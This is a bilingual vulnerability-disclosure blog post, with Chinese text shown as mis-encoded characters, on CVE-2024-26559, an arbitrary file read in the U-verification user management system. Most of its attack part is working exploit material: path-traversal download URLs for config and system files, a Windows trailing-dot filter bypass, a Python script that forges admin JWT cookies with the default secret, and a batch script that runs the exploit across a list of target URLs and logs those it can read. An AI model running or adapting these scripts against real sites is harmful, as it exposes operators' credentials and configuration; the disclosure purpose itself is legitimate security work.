=== Content from syst1m.cn_1317db31_20250111_193800.html ===
![åŠ è½½å¤´åƒ](https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg)ç½‘é¡µ[![åšå®¢](data:image/gif;base64...)åšå®¢](https://syst1m.cn/ "åšå®¢")[![è¯­é›€](data:image/gif;base64...)è¯­é›€](https://www.yuque.com/076w "è¯­é›€")é¡¹ç›®[![Github](data:image/gif;base64...)Github](https://github.com/076w "Github")[076w](/)PAGE\_NAME æ–‡ç« 

* [éš§é“](/archives/)
* [åˆ†ç±»](/categories/)
* [æ ‡ç­¾](/tags/)
 å‹é“¾

* [å‹äººå¸](/link/)
* [æœ‹å‹åœˆ](/fcircle/)
* [ç•™è¨€æ¿](/comments/)
 æˆ‘çš„

* [éŸ³ä¹é¦†](/music/)
* [è¿½ç•ªé¡µ](/bangumis/)
* [ç›¸å†Œé›†](/album/)
* [å°ç©ºè°ƒ](/air-conditioner/)
 å…³äº

* [å…³äºæœ¬äºº](/about/)
* [é—²è¨€ç¢è¯­](/essay/)
* éšä¾¿é€›é€›

* [![å¾®ä¿¡](https://raw.githubusercontent.com/076w/Image/pic/notes/qrcode-weichat.png)](https://raw.githubusercontent.com/076w/Image/pic/notes/qrcode-weichat.png)å¾®ä¿¡
* [![æ”¯ä»˜å®](https://raw.githubusercontent.com/076w/Image/pic/notes/qrcode-alipay.png)](https://raw.githubusercontent.com/076w/Image/pic/notes/qrcode-alipay.png)æ”¯ä»˜å®
äº’åŠ¨ æœ€æ–°è¯„è®ºæ­£åœ¨åŠ è½½ä¸­...å…´è¶£ç‚¹å¯»æ‰¾ä½ æ„Ÿå…´è¶£çš„é¢†åŸŸ[HackTheBox3](/tags/HackTheBox/)[Mac1](/tags/Mac/)[python3](/tags/python/)[åŸåˆ›æ¼æ´1](/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/)[å®‰å“æ¨¡æ‹Ÿå™¨1](/tags/%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8/)[ç½‘ç»œå®‰å…¨2](/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/)

---

æ–‡ç« å½’æ¡£

* [ä¸€æœˆ 20241ç¯‡](/archives/2024/01/)
* [åä¸€æœˆ 20231ç¯‡](/archives/2023/11/)
* [åæœˆ 20232ç¯‡](/archives/2023/10/)
* [å…«æœˆ 20237ç¯‡](/archives/2023/08/)

---

0åŸåˆ›[ç¬”è®°](/categories/%E7%AC%94%E8%AE%B0/)[åŸåˆ›æ¼æ´](/categories/%E7%AC%94%E8%AE%B0/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/) [åŸåˆ›æ¼æ´](/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/)
# UéªŒè¯ä»»æ„æ–‡ä»¶è¯»å–(CVE-2024-26559)

å‘è¡¨äº2024-01-22æ›´æ–°äº2024-02-25å­—æ•°æ€»è®¡:3.3ké˜…è¯»æ—¶é•¿:16åˆ†é’Ÿé˜…è¯»é‡: æ±Ÿè‹![](https://bing.img.run/rand.php?_r_=86e4e253-35d8-21b4-9267-07f0e06e24ab)[ç¬”è®°](/categories/%E7%AC%94%E8%AE%B0/)[åŸåˆ›æ¼æ´](/categories/%E7%AC%94%E8%AE%B0/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/)[åŸåˆ›æ¼æ´](/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/)
# UéªŒè¯ä»»æ„æ–‡ä»¶è¯»å–(CVE-2024-26559)

076w2024-01-222024-02-25
# ä¸­æ–‡ï¼š

## UéªŒè¯ç½‘ç»œç”¨æˆ·ç®¡ç†ç³»ç»Ÿå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´

æœç´¢å¼•æ“: body=â€Uç”¨æˆ·éªŒè¯ç³»ç»Ÿ1.0â€

å®˜ç½‘: <https://user.uverif.com/>

Github: <https://github.com/51154393/uverif>

Gitee: <https://gitee.com/dagg/uverif>

## åå°ä»»æ„æ–‡ä»¶è¯»å–

å½“å‰æœ€æ–°æµ‹è¯•ç‰ˆæœ¬ä¸ºv2.0.4-betaï¼Œæ­£å¼å‘å¸ƒç‰ˆæœ¬ä¸ºv2.0ï¼Œå‡å­˜åœ¨æ­¤ç±»æ¼æ´

![image-20240218153356759](data:image/gif;base64...)

å…¶æ¼æ´ç‚¹åœ¨äºç™»å½•åå°åç”Ÿæˆå¡å¯†å¯¼å‡ºçš„ä¸‹è½½å¤„

![img](data:image/gif;base64...)

<http://127.0.0.1/admin/download?path=./app/data/kami/202401210556174.txt>

![img](data:image/gif;base64...)

ä¿®æ”¹è·¯å¾„å³å¯æ„é€ ä»»æ„æ–‡ä»¶è¯»å–, â€œ./â€œä»£è¡¨å½“å‰ç›®å½•,å¯è¯»å–æ•°æ®åº“é…ç½®æ–‡ä»¶,å½“å‰ç®¡ç†å‘˜è´¦æˆ·å¯†ç ç­‰

<http://127.0.0.1/admin/download?path=./config/admin.php>

<http://127.0.0.1/admin/download?path=./config/config.php>

![img](data:image/gif;base64...)

![img](data:image/gif;base64...)

æŸ¥çœ‹æºç 

<https://github.com/51154393/uverif/blob/main/Ue/tools/download.php>

![img](data:image/gif;base64...)

è¿™æ˜¯ä¸€ä¸ªPHPå‘½åç©ºé—´ä¸ºUe\toolsçš„ç±»downloadçš„ä»£ç ã€‚è¯¥ç±»æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•downloadï¼Œç”¨äºä¸‹è½½æ–‡ä»¶ã€‚

æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼š$filenameè¡¨ç¤ºè¦ä¸‹è½½çš„æ–‡ä»¶è·¯å¾„ï¼Œ$downLoadNameè¡¨ç¤ºä¸‹è½½æ—¶ä¿å­˜çš„æ–‡ä»¶åï¼ˆå¯é€‰ï¼Œé»˜è®¤ä¸ºåŸå§‹æ–‡ä»¶åï¼‰ã€‚

è¯¥æ–¹æ³•çš„ä¸»è¦é€»è¾‘å¦‚ä¸‹ï¼š

1. é¦–å…ˆæ£€æŸ¥$downLoadNameæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºåˆ™å°†å…¶è®¾ä¸º$filenameã€‚
2. æ£€æŸ¥$filenameä¸­æ˜¯å¦åŒ…å«.ï¼Œå¦‚æœä¸åŒ…å«åˆ™è¿”å›falseï¼Œè¡¨ç¤ºæ— æ³•ç¡®å®šæ–‡ä»¶ç±»å‹ã€‚
3. è®¾ç½®å“åº”çš„MIMEç±»å‹ä¸ºapplication/octet-streamï¼Œè¡¨ç¤ºé€šç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶ç±»å‹ã€‚
4. ä½¿ç”¨fopenå‡½æ•°ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶é€šè¿‡freadå‡½æ•°è¯»å–æ–‡ä»¶çš„å†…å®¹ã€‚
5. å…³é—­æ–‡ä»¶å¥æŸ„ã€‚
6. åˆ¤æ–­å®¢æˆ·ç«¯çš„HTTP\_USER\_AGENTä¸­æ˜¯å¦åŒ…å«â€MSIEâ€ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è®¾ç½®ä¸€ç³»åˆ—å“åº”å¤´ä¿¡æ¯ï¼ŒåŒ…æ‹¬Content-Typeã€Content-Dispositionç­‰ï¼Œä»¥æ”¯æŒåœ¨IEæµè§ˆå™¨ä¸­ä¸‹è½½æ–‡ä»¶ã€‚
7. å¦‚æœä¸æ˜¯IEæµè§ˆå™¨ï¼Œåˆ™è®¾ç½®å¦ä¸€ç»„å“åº”å¤´ä¿¡æ¯ã€‚
8. æœ€åä½¿ç”¨exitå‡½æ•°è¾“å‡ºæ–‡ä»¶å†…å®¹ï¼Œå¹¶ç»“æŸè„šæœ¬çš„æ‰§è¡Œã€‚

å½“å‰æ­å»ºç¯å¢ƒä¸ºWindowsç³»ç»Ÿä¸”æ£€æŸ¥$filenameä¸­æ˜¯å¦åŒ…å«â€.â€,æ‰€ä»¥å°è¯•è¯»å–win.iniæ–‡ä»¶

C:\Windows\win.ini

![img](data:image/gif;base64...)

å°è¯•è¯»å–hostsæ–‡ä»¶,æ£€æŸ¥â€œ.â€æ‰€ä»¥åœ¨hostsæ–‡ä»¶ååŠ â€œ.â€

åŸç†æ˜¯Windowsç³»ç»Ÿé»˜è®¤åˆ é™¤æ–‡ä»¶åç¼€çš„â€œ.â€å’Œç©ºæ ¼ã€‚è‹¥ç½‘ç«™åç«¯è¿‡æ»¤æ—¶æ²¡æœ‰è¿‡æ»¤æœ«å°¾çš„ç‚¹ï¼Œä¾¿å¯è¿›è¡Œç»•è¿‡ã€‚

C:\Windows\System32\drivers\etc\hosts.

![img](data:image/gif;base64...)

å°è¯•è¯»å–linuxç³»ç»Ÿä¸‹æ–‡ä»¶

/etc/resolv.conf

![img](data:image/gif;base64...)

## å‰å°ä»»æ„æ–‡ä»¶è¯»å–

å°è¯•æ‰©å¤§å±å®³,å°†æ¼æ´å‡çº§

è§‚å¯Ÿ Cookie å­—æ®µä¸­ admcookies ä¸º jwt åŠ å¯†,å°è¯•è§£å¯†

![img](data:image/gif;base64...)

æŸ¥çœ‹æºç åˆ†ææ„é€ 

<https://github.com/51154393/uverif/blob/main/Ue/tools/Jwt.php>

![img](data:image/gif;base64...)

JWTï¼ˆJSON Web Tokenï¼‰æ˜¯ä¸€ç§ç”¨äºèº«ä»½éªŒè¯å’Œæˆæƒçš„å¼€æ”¾æ ‡å‡†ã€‚å®ƒç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šå¤´éƒ¨ï¼ˆheaderï¼‰ã€è½½è·ï¼ˆpayloadï¼‰å’Œç­¾åï¼ˆsignatureï¼‰ã€‚

åœ¨ç»™å®šçš„ä»£ç ä¸­ï¼ŒJWTçš„å‚æ•°ç”Ÿæˆå¦‚ä¸‹ï¼š

1. å¤´éƒ¨ï¼ˆheaderï¼‰ï¼šä½¿ç”¨ç®—æ³•HS256ï¼ˆHMAC SHA-256ï¼‰ç”Ÿæˆç­¾åï¼Œåœ¨ä»£ç ä¸­è¡¨ç¤ºä¸ºâ€™algâ€™ => â€˜HS256â€™ã€‚
2. è½½è·ï¼ˆpayloadï¼‰ï¼šåŒ…å«äº†ä¸€äº›å£°æ˜ä¿¡æ¯ï¼Œå¯æ ¹æ®éœ€è¦è‡ªå®šä¹‰ã€‚åœ¨ä»£ç ä¸­ï¼Œè½½è·åŒ…å«ä»¥ä¸‹å­—æ®µï¼š

* issï¼šè¡¨ç¤ºè¯¥JWTçš„ç­¾å‘è€…ã€‚
* iatï¼šè¡¨ç¤ºç­¾å‘æ—¶é—´ï¼Œä½¿ç”¨time()å‡½æ•°è·å–å½“å‰æ—¶é—´ã€‚
* expï¼šè¡¨ç¤ºè¿‡æœŸæ—¶é—´ï¼Œå½“å‰æ—¶é—´åŠ ä¸Š24å°æ—¶ã€‚
* nbfï¼šè¯¥æ—¶é—´ä¹‹å‰ä¸æ¥æ”¶å¤„ç†è¯¥Tokenã€‚
* subï¼šè¡¨ç¤ºé¢å‘çš„ç”¨æˆ·ï¼Œé»˜è®¤ä¸ºå½“å‰è¯·æ±‚çš„åŸŸåã€‚
* jtiï¼šè¡¨ç¤ºè¯¥Tokençš„å”¯ä¸€æ ‡è¯†ï¼Œä½¿ç”¨md5(uniqid(â€˜JWTâ€™) . time())ç”Ÿæˆã€‚
* claimï¼šè¡¨ç¤ºè‡ªå®šä¹‰æ•°æ®ï¼Œå¯æ ¹æ®éœ€è¦è®¾ç½®ã€‚

3. ç­¾åï¼ˆsignatureï¼‰ï¼šä½¿ç”¨å¯†é’¥ï¼ˆkeyï¼‰å¯¹å¤´éƒ¨å’Œè½½è·è¿›è¡Œç­¾åç”Ÿæˆã€‚ç­¾åç®—æ³•ä½¿ç”¨HS256ï¼Œé€šè¿‡è°ƒç”¨self::signature()æ–¹æ³•å®ç°ã€‚

æœ€ç»ˆï¼Œé€šè¿‡å°†base64ç¼–ç åçš„å¤´éƒ¨ã€è½½è·å’Œç­¾åæ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå¹¶ç”¨â€.â€åˆ†éš”ï¼Œå½¢æˆJWT Tokenã€‚

ç”¨pythonç”ŸæˆCookie

| ``` 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 ``` | ``` import hashlibimport timeimport jwtimport reimport requestsone_day = 24 * 60 * 60  # ä¸€å¤©çš„ç§’æ•°# ç”Ÿæˆå¤´éƒ¨header = {    "alg": "HS256",    "typ": "JWT"}# ä½¿ç”¨å¯†é’¥è¿›è¡Œç­¾åsecret = "your-256-bit-secret"url = input("è¯·è¾“å…¥URL(å¦‚ http://127.0.0.1:888/): ")  # æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„URLtry:    response = requests.post(url + "/admin.php", verify=False, timeout=10, allow_redirects=False)    if response.status_code == 302:        session_id = response.cookies.get('PHPSESSID')    else:        print(f"è·å–{url}å“åº”å¤±è´¥")except requests.exceptions.Timeout:    print(f"{url} è¯·æ±‚è¶…æ—¶")except requests.exceptions.RequestException as e:    print(f"æ— æ³•è¿æ¥åˆ°{url}: {e}")unique_id = hashlib.md5(str(time.time()).encode('utf-8')).hexdigest()sub = re.sub(r'^https?://', '', url)  # å»é™¤åè®®éƒ¨åˆ†sub = re.sub(r'/$', '', sub)  # å»é™¤æœ«å°¾æ–œæ print(sub)# ç”Ÿæˆè½½è·payload = {    "iss": "admin",    "iat": int(time.time()),    "exp": int(time.time()) + one_day,  # è¿‡æœŸæ—¶é—´ä¸ºå½“å‰æ—¶é—´åä¸€å¤©    "nbf": int(time.time()),  # ç”Ÿæ•ˆæ—¶é—´ä¸ºå½“å‰æ—¶é—´    "sub": sub,    "jti": unique_id,    "claim": None}token = jwt.encode(payload, secret, algorithm="HS256", headers=header)print("Cookie: " + f'PHPSESSID={session_id}; admcookies={token}; appid=1000') ``` |
| --- | --- |

![image-20240223124816765](data:image/gif;base64...)

æŠ“å–ç™»é™†æ•°æ®åŒ…ï¼Œæ›¿æ¢ç”Ÿæˆçš„Cookieå¹¶å‘åŒ…

<http://127.0.0.1/admin.php>

![image-20240223125215478](data:image/gif;base64...)

è®¿é—®æ¼æ´urlï¼Œå¹¶æ›¿æ¢Cookieå‘åŒ…å³å¯

<http://127.0.0.1/admin/download?path=./config/config.php>

![image-20240223125546385](data:image/gif;base64...)

## æ‰¹é‡æ£€æµ‹POC:

url.txtå­˜æ”¾æ£€æµ‹çš„url,æºç ç›´æ¥è¿è¡Œ,æ— éœ€ä¿®æ”¹

![img](data:image/gif;base64...)

| ``` 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 ``` | ``` import requestsimport jwtimport hashlibimport reimport timefrom requests.packages.urllib3.exceptions import InsecureRequestWarning# ç¦ç”¨ä¸å®‰å…¨è¯·æ±‚çš„è­¦å‘Šrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)one_day = 24 * 60 * 60  # ä¸€å¤©çš„ç§’æ•°header = {    "alg": "HS256",    "typ": "JWT"}secret = "your-256-bit-secret"vulnerable_urls = []def get_session_id(url):    try:        response = requests.post(f"{url}/admin.php", verify=False, timeout=10, allow_redirects=False)        if response.status_code == 302:            return response.cookies.get('PHPSESSID')        else:            print(f"è·å–{url}å“åº”å¤±è´¥")    except requests.exceptions.Timeout:        print(f"{url} è¯·æ±‚è¶…æ—¶")    except requests.exceptions.RequestException as e:        print(f"æ— æ³•è¿æ¥åˆ°{url}: {e}")    return Nonedef generate_payload(url):    unique_id = hashlib.md5(str(time.time()).encode('utf-8')).hexdigest()    sub = re.sub(r'^https?://', '', url).rstrip('/')    payload = {        "iss": "admin",        "iat": int(time.time()),        "exp": int(time.time()) + one_day,        "nbf": int(time.time()),        "sub": sub,        "jti": unique_id,        "claim": None    }    return jwt.encode(payload, secret, algorithm="HS256", headers=header)def exploit_vulnerability(url, session_id, token):    headers = {        'Accept': 'application/json, text/javascript, */*; q=0.01',        'X-Requested-With': 'XMLHttpRequest',        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',        'Cookie': f'PHPSESSID={session_id}; admcookies={token}; appid=1000',        'Accept-Encoding': 'gzip, deflate',        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'    }    data = {'user': 'admin', 'password': 'admin'}    response = requests.post(f"{url}/admin.php", headers=headers, data=data, verify=False)    file = requests.get(f"{url}/admin/download?path=./config/admin.php", headers=headers, data=data,                        allow_redirects=False, verify=False)    if "ç®¡ç†å‘˜é…ç½®" in file.text:        vulnerable_urls.append(url)        print(url,file.text)        with open('å­˜åœ¨æ¼æ´.txt', 'w') as file:            for vul_url in vulnerable_urls:                file.write(vul_url + '\n')with open('url.txt') as file:    for url in file:        url = url.strip()        session_id = get_session_id(url)        if session_id:            token = generate_payload(url)            exploit_vulnerability(url, session_id, token) ``` |
| --- | --- |

![img](data:image/gif;base64...)

# English:

## There is an arbitrary file reading vulnerability in the U-verification network user management system

search engine: body=â€Uç”¨æˆ·éªŒè¯ç³»ç»Ÿ1.0â€

Official website: <https://user.uverif.com/>

Github: <https://github.com/51154393/uverif>

Gitee: <https://gitee.com/dagg/uverif>

## Read any file in the background

The latest test version is v2.0.4-beta and the officially released version is v2.0, both of which have such vulnerabilities.

![image-20240218153356759](data:image/gif;base64...)

The vulnerability lies in the download place where the card password is exported after logging in to the backend.

![img](data:image/gif;base64...)

<http://127.0.0.1/admin/download?path=./app/data/kami/202401210556174.txt>

![img](data:image/gif;base64...)

Modify the path to construct any file to read, â€œ./â€œ represents the current directory, and can read the database configuration file, current administrator account password, etc.

<http://127.0.0.1/admin/download?path=./config/admin.php>

<http://127.0.0.1/admin/download?path=./config/config.php>

![img](data:image/gif;base64...)

![img](data:image/gif;base64...)

View source code

<https://github.com/51154393/uverif/blob/main/Ue/tools/download.php>

![img](data:image/gif;base64...)

This is a code for class download in the PHP namespace Ue\tools. This class provides a static method download for downloading files.
The method accepts two parameters: $filename represents the path of the file to be downloaded, $downLoadName represents the file name saved during downloading (optional, defaults to the original file name).
The main logic of this method is as follows:

1. First check whether $downLoadName is empty, and if it is empty, set it to $filename.
2. Check whether $filename contains ., if not, return false, indicating that the file type cannot be determined.
3. Set the response MIME type to application/octet-stream, which represents a common binary file type.
4. Use the fopen function to open the file in read-only mode, and read the contents of the file through the fread function.
5. Close the file handle.
6. Determine whether the clientâ€™s HTTP\_USER\_AGENT contains â€œMSIEâ€. If so, set a series of response header information, including Content-Type, Content-Disposition, etc., to support downloading files in the IE browser.
7. If it is not an IE browser, set another set of response header information.
8. Finally, use the exit function to output the file content and end the execution of the script.

The current build environment is a Windows system and check whether $filename contains â€œ.â€, so try to read the win.ini file

C:\Windows\win.ini

![img](data:image/gif;base64...)

Try to read the hosts file and check â€œ.â€ so add â€œ.â€ after the hosts file.

The principle is that the Windows system deletes the â€œ.â€ and spaces in the file suffix by default. If the back-end filtering of the website does not include the dot at the end of the filter, it can be bypassed.

C:\Windows\System32\drivers\etc\hosts.

![img](data:image/gif;base64...)

Try to read files under linux system

/etc/resolv.conf

![img](data:image/gif;base64...)

## Read any file in the foreground

Try to expand the harm and upgrade the vulnerability

Observe that admcookies in the Cookie field is encrypted by jwt and try to decrypt it.

![img](data:image/gif;base64...)

View source code analysis structure

<https://github.com/51154393/uverif/blob/main/Ue/tools/Jwt.php>

![img](data:image/gif;base64...)

JWT (JSON Web Token) is an open standard for authentication and authorization. It consists of three parts: header, payload and signature.

In the given code, the parameters of the JWT are generated as follows:

1. Header: Use algorithm HS256 (HMAC SHA-256) to generate a signature, represented in the code as â€˜algâ€™ => â€˜HS256â€™.
2. Payload: Contains some declaration information and can be customized as needed. In the code, the payload contains the following fields:

* iat: indicates the issuance time, use the time() function to obtain the current time.
* iss: Indicates the issuer of the JWT.
* exp: indicates the expiration time, the current time plus 24 hours.
* nbf: The Token will not be processed before this time.
* sub: indicates the user targeted, defaulting to the currently requested domain name.
* jti: represents the unique identifier of the Token, generated using md5(uniqid(â€˜JWTâ€™) . time()).
* claim: represents custom data, which can be set as needed.

3. Signature: Use the key to generate signatures for the header and payload. The signature algorithm uses HS256 and is implemented by calling the self::signature() method.

Finally, the JWT Token is formed by splicing the base64-encoded header, payload and signature together and separating them with â€œ.â€.

Generate cookies using python

| ``` 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 ``` | ``` import hashlibimport timeimport jwtimport reimport requestsone_day = 24 * 60 * 60  # ä¸€å¤©çš„ç§’æ•°# ç”Ÿæˆå¤´éƒ¨header = {    "alg": "HS256",    "typ": "JWT"}# ä½¿ç”¨å¯†é’¥è¿›è¡Œç­¾åsecret = "your-256-bit-secret"url = input("è¯·è¾“å…¥URL(å¦‚ http://127.0.0.1:888/): ")  # æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„URLtry:    response = requests.post(url + "/admin.php", verify=False, timeout=10, allow_redirects=False)    if response.status_code == 302:        session_id = response.cookies.get('PHPSESSID')    else:        print(f"è·å–{url}å“åº”å¤±è´¥")except requests.exceptions.Timeout:    print(f"{url} è¯·æ±‚è¶…æ—¶")except requests.exceptions.RequestException as e:    print(f"æ— æ³•è¿æ¥åˆ°{url}: {e}")unique_id = hashlib.md5(str(time.time()).encode('utf-8')).hexdigest()sub = re.sub(r'^https?://', '', url)  # å»é™¤åè®®éƒ¨åˆ†sub = re.sub(r'/$', '', sub)  # å»é™¤æœ«å°¾æ–œæ print(sub)# ç”Ÿæˆè½½è·payload = {    "iss": "admin",    "iat": int(time.time()),    "exp": int(time.time()) + one_day,  # è¿‡æœŸæ—¶é—´ä¸ºå½“å‰æ—¶é—´åä¸€å¤©    "nbf": int(time.time()),  # ç”Ÿæ•ˆæ—¶é—´ä¸ºå½“å‰æ—¶é—´    "sub": sub,    "jti": unique_id,    "claim": None}token = jwt.encode(payload, secret, algorithm="HS256", headers=header)print("Cookie: " + f'PHPSESSID={session_id}; admcookies={token}; appid=1000') ``` |
| --- | --- |

![image-20240223124816765](data:image/gif;base64...)

Capture the login data packet and replace the generated Cookie concurrent packet

<http://127.0.0.1/admin.php>

![image-20240223125215478](data:image/gif;base64...)

Visit the vulnerability URL and replace the cookie to send the package.

<http://127.0.0.1/admin/download?path=./config/config.php>

![image-20240223125546385](data:image/gif;base64...)

## Batch testing POC:

Try to write a python script to construct jwt and write a poc

url.txt stores the detected URL, and the source code can be run directly without modification.

![img](data:image/gif;base64...)

| ``` 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879 ``` | ``` import requestsimport jwtimport hashlibimport reimport timefrom requests.packages.urllib3.exceptions import InsecureRequestWarning# ç¦ç”¨ä¸å®‰å…¨è¯·æ±‚çš„è­¦å‘Šrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)one_day = 24 * 60 * 60  # ä¸€å¤©çš„ç§’æ•°header = {    "alg": "HS256",    "typ": "JWT"}secret = "your-256-bit-secret"vulnerable_urls = []def get_session_id(url):    try:        response = requests.post(f"{url}/admin.php", verify=False, timeout=10, allow_redirects=False)        if response.status_code == 302:            return response.cookies.get('PHPSESSID')        else:            print(f"è·å–{url}å“åº”å¤±è´¥")    except requests.exceptions.Timeout:        print(f"{url} è¯·æ±‚è¶…æ—¶")    except requests.exceptions.RequestException as e:        print(f"æ— æ³•è¿æ¥åˆ°{url}: {e}")    return Nonedef generate_payload(url):    unique_id = hashlib.md5(str(time.time()).encode('utf-8')).hexdigest()    sub = re.sub(r'^https?://', '', url).rstrip('/')    payload = {        "iss": "admin",        "iat": int(time.time()),        "exp": int(time.time()) + one_day,        "nbf": int(time.time()),        "sub": sub,        "jti": unique_id,        "claim": None    }    return jwt.encode(payload, secret, algorithm="HS256", headers=header)def exploit_vulnerability(url, session_id, token):    headers = {        'Accept': 'application/json, text/javascript, */*; q=0.01',        'X-Requested-With': 'XMLHttpRequest',        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',        'Cookie': f'PHPSESSID={session_id}; admcookies={token}; appid=1000',        'Accept-Encoding': 'gzip, deflate',        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'    }    data = {'user': 'admin', 'password': 'admin'}    response = requests.post(f"{url}/admin.php", headers=headers, data=data, verify=False)    file = requests.get(f"{url}/admin/download?path=./config/admin.php", headers=headers, data=data,                        allow_redirects=False, verify=False)    if "ç®¡ç†å‘˜é…ç½®" in file.text:        vulnerable_urls.append(url)        print(url,file.text)        with open('å­˜åœ¨æ¼æ´.txt', 'w') as file:            for vul_url in vulnerable_urls:                file.write(vul_url + '\n')with open('url.txt') as file:    for url in file:        url = url.strip()        session_id = get_session_id(url)        if session_id:            token = generate_payload(url)            exploit_vulnerability(url, session_id, token) ``` |
| --- | --- |

![img](data:image/gif;base64...)

[![å¤´åƒ](data:image/gif;base64... "å¤´åƒ")![å¤´åƒ](data:image/gif;base64... "å¤´åƒ")](/ "å¤´åƒ")076wé ˆçŸ¥å°‘æ™‚å‡Œé›²å¿— æ›¾è¨±äººé–“ç¬¬ä¸€æµ[åŸåˆ›](http://syst1m.cn/2024/01/22/U%E9%AA%8C%E8%AF%81%E7%BD%91%E7%BB%9C%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/ "è¯¥æ–‡ç« ä¸ºåŸåˆ›æ–‡ç« ï¼Œæ³¨æ„ç‰ˆæƒåè®®")UéªŒè¯ä»»æ„æ–‡ä»¶è¯»å–(CVE-2024-26559)æ‰“èµä½œè€…æ„Ÿè°¢ä½ èµäºˆæˆ‘å‰è¿›çš„åŠ›é‡

* [![å¾®ä¿¡](data:image/gif;base64...)](https://raw.githubusercontent.com/076w/Image/pic/notes/qrcode-weichat.png)å¾®ä¿¡
* [![æ”¯ä»˜å®](data:image/gif;base64...)](https://raw.githubusercontent.com/076w/Image/pic/notes/qrcode-alipay.png)æ”¯ä»˜å®

[èµèµè€…åå•å› ä¸ºä½ ä»¬çš„æ”¯æŒè®©æˆ‘æ„è¯†åˆ°å†™æ–‡ç« çš„ä»·å€¼ğŸ™](/about/#about-reward)ä½¿ç”¨æ‰‹æœºè®¿é—®è¿™ç¯‡æ–‡ç« æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª [076w](http://syst1m.cn)ï¼ [ç¬”è®°9](/categories/%E7%AC%94%E8%AE%B0/) [åŸåˆ›æ¼æ´1](/categories/%E7%AC%94%E8%AE%B0/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/) [åŸåˆ›æ¼æ´1](/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/)[![cover of previous post](data:image/gif;base64...)ä¸Šä¸€ç¯‡Clicker\_Medium](/2023/11/03/Clicker_Medium/)![avatar](data:image/gif;base64...)ğŸ‘¨â€ğŸ“ è¯»ä¹¦ | å¤ªåŸ è®¡ç®—æœºç½‘ç»œæŠ€æœ¯
ğŸ‘¨â€ğŸ’» å·¥ä½œ | æ±Ÿè‹ æ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆ
ğŸƒ çˆ±å¥½ | ç ”ç©¶ã€å‘å‘†
ğŸ·ï¸ æ ‡ç­¾ | ç”· 00å ç¤¾æ
ğŸ“¥ é‚®ç®± | admin@syst1m.cn
[# 076w

é ˆçŸ¥å°‘æ™‚å‡Œé›²å¿— æ›¾è¨±äººé–“ç¬¬ä¸€æµ](/)æ–‡ç« ç›®å½•

1. [1. ä¸­æ–‡ï¼š](#%E4%B8%AD%E6%96%87%EF%BC%9A)
   1. [1.1. UéªŒè¯ç½‘ç»œç”¨æˆ·ç®¡ç†ç³»ç»Ÿå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´](#U%E9%AA%8C%E8%AF%81%E7%BD%91%E7%BB%9C%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E)
   2. [1.2. åå°ä»»æ„æ–‡ä»¶è¯»å–](#%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
   3. [1.3. å‰å°ä»»æ„æ–‡ä»¶è¯»å–](#%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
   4. [1.4. æ‰¹é‡æ£€æµ‹POC:](#%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8BPOC)
2. [2. English:](#English)
   1. [2.1. There is an arbitrary file reading vulnerability in the U-verification network user management system](#There-is-an-arbitrary-file-reading-vulnerability-in-the-U-verification-network-user-management-system)
